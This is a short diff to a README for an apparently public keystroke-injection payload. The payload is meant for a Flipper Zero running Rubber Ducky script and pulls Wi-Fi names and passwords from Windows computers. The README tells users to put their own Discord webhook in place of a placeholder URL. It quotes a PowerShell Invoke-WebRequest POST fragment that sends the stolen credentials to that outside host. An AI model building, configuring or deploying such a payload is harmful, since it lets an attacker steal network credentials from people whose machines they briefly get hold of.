@@ -14,7 +14,7 @@ Obtain Wi-Fi names and passwords from a Microsoft Windows operating system compu
 > The payload was designed for a Flipper Zero using the classic Rubber Ducky Scripting Language 1.0 to exfiltrate data through the use of Discord webhooks. It can also be used as a regular payload with a webhook.
 
 # 📄 Instructions
-1. Replace "https://YOUR_LINK_HERE.com" in [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) with your custom webhook.
+1. Replace `"https://YOUR_LINK_HERE.com"` in [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) with your custom webhook.
 
 `...Invoke-WebRequest -Uri https://YOUR_LINK_HERE.com -Method Post...`
 
